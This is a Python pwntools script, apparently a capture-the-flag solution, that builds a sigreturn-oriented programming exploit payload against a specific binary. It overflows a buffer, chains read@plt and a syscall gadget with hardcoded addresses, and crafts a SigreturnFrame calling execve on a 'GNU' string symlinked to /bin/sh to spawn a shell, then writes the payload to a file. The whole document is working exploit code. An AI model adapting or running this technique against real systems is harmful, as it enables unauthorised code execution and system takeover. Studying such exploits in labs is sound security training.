from pwn import  *

# make symbolic link GNU -> /bin/sh

payload = ''

payload += 'a' * 16

payload += p64(0x7fffffffe900) # ebp
payload += p64(0x0000000000400430) # read plt
payload += p64(0x0000000000400560) # syscall

# Frame
context.clear(arch='x86_64')
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x400280 # GNU
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x400560
frame.csgsfs = 0x2b0033

payload += str(frame)

'''
rax = 59
rdi = 0x400280 # GNU
rsi = 0
rax = 0
rbx = 0
rcx = 0
rdx = 0
rbp = 0
rsp = 0
rip = 0x400560
csgsfs = 0x2b0033

payload += ''
payload += p64(0xdeadbeefdeadbeef) * 5
payload += p64(0) * 8
payload += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx)
payload += p64(rdx) + p64(rax) + p64(rcx) + p64(rsp)
payload += p64(rip)
payload += p64(0)
payload += p64(csgsfs)
payload += p64(0) * 6
'''

payload += '_' * (1295 - len(payload))

payload += '$' * 15

f = open('input', 'w')
f.write(payload)
f.close()
